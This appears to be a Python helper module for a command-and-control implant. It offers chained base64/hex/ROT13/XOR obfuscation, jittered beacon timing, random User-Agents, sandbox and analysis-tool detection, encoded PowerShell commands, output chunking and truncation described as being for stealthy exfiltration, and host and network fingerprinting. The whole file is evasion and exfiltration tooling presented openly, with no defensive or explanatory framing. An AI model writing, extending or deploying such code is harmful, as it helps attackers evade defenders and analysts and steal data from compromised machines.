"""
Utility functions for encoding, evasion, and stealth techniques
"""

import base64
import json
import random
import string
import hashlib
import time

class EncodingSchemes:
    """Multiple encoding schemes for obfuscation"""
    
    @staticmethod
    def base64_encode(data):
        """Standard Base64 encoding"""
        return base64.b64encode(data.encode()).decode()
    
    @staticmethod
    def base64_decode(data):
        """Standard Base64 decoding"""
        return base64.b64decode(data.encode()).decode()
    
    @staticmethod
    def hex_encode(data):
        """Hex encoding"""
        return data.encode().hex()
    
    @staticmethod
    def hex_decode(data):
        """Hex decoding"""
        return bytes.fromhex(data).decode()
    
    @staticmethod
    def rot13_encode(data):
        """ROT13 Caesar cipher"""
        result = []
        for char in data:
            if char.isalpha():
                if char.islower():
                    result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
                else:
                    result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def xor_encode(data, key=0x42):
        """XOR encoding with variable key"""
        return ''.join(chr(ord(c) ^ key) for c in data)
    
    @staticmethod
    def xor_decode(data, key=0x42):
        """XOR decoding"""
        return EncodingSchemes.xor_encode(data, key)
    
    @staticmethod
    def chain_encode(data, scheme='base64_hex'):
        """Chain multiple encoding schemes"""
        if scheme == 'base64_hex':
            data = EncodingSchemes.base64_encode(data)
            return EncodingSchemes.hex_encode(data)
        elif scheme == 'hex_rot13':
            data = EncodingSchemes.hex_encode(data)
            return EncodingSchemes.rot13_encode(data)
        elif scheme == 'base64_rot13':
            data = EncodingSchemes.base64_encode(data)
            return EncodingSchemes.rot13_encode(data)
        return data
    
    @staticmethod
    def chain_decode(data, scheme='base64_hex'):
        """Chain decode multiple encoding schemes"""
        if scheme == 'base64_hex':
            data = EncodingSchemes.hex_decode(data)
            return EncodingSchemes.base64_decode(data)
        elif scheme == 'hex_rot13':
            data = EncodingSchemes.rot13_encode(data)  # ROT13 is reversible
            return EncodingSchemes.hex_decode(data)
        elif scheme == 'base64_rot13':
            data = EncodingSchemes.rot13_encode(data)  # ROT13 is reversible
            return EncodingSchemes.base64_decode(data)
        return data


class EvasionTechniques:
    """Anti-analysis and behavior evasion techniques"""
    
    @staticmethod
    def random_sleep(min_sec=5, max_sec=15):
        """Random sleep to evade time-based analysis"""
        sleep_time = random.randint(min_sec, max_sec)
        time.sleep(sleep_time)
    
    @staticmethod
    def randomize_beacon_interval(base_interval=10, variance=5):
        """Randomize beacon interval to evade pattern detection"""
        return base_interval + random.randint(-variance, variance)
    
    @staticmethod
    def generate_random_useragent():
        """Generate random User-Agent to evade fingerprinting"""
        useragents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Android; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15",
        ]
        return random.choice(useragents)
    
    @staticmethod
    def generate_random_agent_id(prefix="Agent"):
        """Generate random but consistent agent ID"""
        random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        return f"{prefix}_{random_suffix}"
    
    @staticmethod
    def hide_command_output(output, max_lines=50):
        """Truncate output to avoid suspicion of large data exfiltration"""
        lines = output.split('\n')
        if len(lines) > max_lines:
            return '\n'.join(lines[:max_lines]) + f"\n... [Output truncated, {len(lines) - max_lines} more lines]"
        return output
    
    @staticmethod
    def randomize_sleep_pattern():
        """Implement random sleep pattern to evade time-based detection"""
        patterns = {
            'constant': lambda: 10,
            'linear': lambda: 10 + random.randint(0, 30),
            'exponential': lambda: min(300, 10 * (1.5 ** random.randint(0, 5))),
            'jittered': lambda: 10 + random.gauss(0, 5)
        }
        pattern = random.choice(list(patterns.keys()))
        return patterns[pattern]()
    
    @staticmethod
    def detect_sandboxed_environment():
        """Detect if running in sandbox/VM/analysis environment"""
        import platform
        import os
        
        suspicious_indicators = [
            'VMWARE', 'VirtualBox', 'QEMU', 'Hyper-V',
            'xen', 'sandbox', 'cuckoo', 'wireshark',
            'fiddler', 'burp', 'frida'
        ]
        
        system_info = platform.platform().upper()
        hostname = os.popen('hostname').read().upper() if os.name != 'nt' else ''
        
        for indicator in suspicious_indicators:
            if indicator in system_info or indicator in hostname:
                return True
        return False


class Utilities:
    """General utility functions"""
    
    @staticmethod
    def hash_data(data, method='sha256'):
        """Hash data using various methods"""
        if method == 'sha256':
            return hashlib.sha256(data.encode()).hexdigest()
        elif method == 'md5':
            return hashlib.md5(data.encode()).hexdigest()
        elif method == 'sha1':
            return hashlib.sha1(data.encode()).hexdigest()
        return None
    
    @staticmethod
    def generate_session_id():
        """Generate unique session ID"""
        return hashlib.sha256(
            (str(time.time()) + ''.join(random.choices(string.ascii_letters, k=16))).encode()
        ).hexdigest()[:16]
    
    @staticmethod
    def obfuscate_command(command):
        """Obfuscate command to evade string detection"""
        # PowerShell: Use character encoding
        if 'powershell' in command.lower():
            encoded = base64.b64encode(command.encode()).decode()
            return f'powershell -enc {encoded}'
        return command
    
    @staticmethod
    def split_large_output(output, chunk_size=2048):
        """Split large output into chunks for exfiltration"""
        chunks = []
        for i in range(0, len(output), chunk_size):
            chunks.append(output[i:i+chunk_size])
        return chunks


class SystemFingerprint:
    """Get system information in a stealthy way"""
    
    @staticmethod
    def get_system_info():
        """Get comprehensive system info"""
        import platform
        import os
        import socket
        
        try:
            return {
                'hostname': socket.gethostname(),
                'platform': platform.system(),
                'version': platform.version(),
                'architecture': platform.machine(),
                'processor': platform.processor(),
                'python_version': platform.python_version(),
                'user': os.environ.get('USER') or os.environ.get('USERNAME'),
                'cwd': os.getcwd()
            }
        except Exception as e:
            return {'error': str(e)}
    
    @staticmethod
    def get_network_interfaces():
        """Get network interface information"""
        try:
            import socket
            import struct
            import fcntl
            
            interfaces = {}
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            try:
                # Get all network interfaces
                import os
                if os.name != 'nt':  # Unix-like systems
                    import subprocess
                    result = subprocess.run(['ip', 'addr'], capture_output=True, text=True)
                    return result.stdout
                else:  # Windows
                    result = subprocess.run(['ipconfig'], capture_output=True, text=True)
                    return result.stdout
            except:
                return "Network info unavailable"
        except Exception as e:
            return f"Error: {str(e)}"
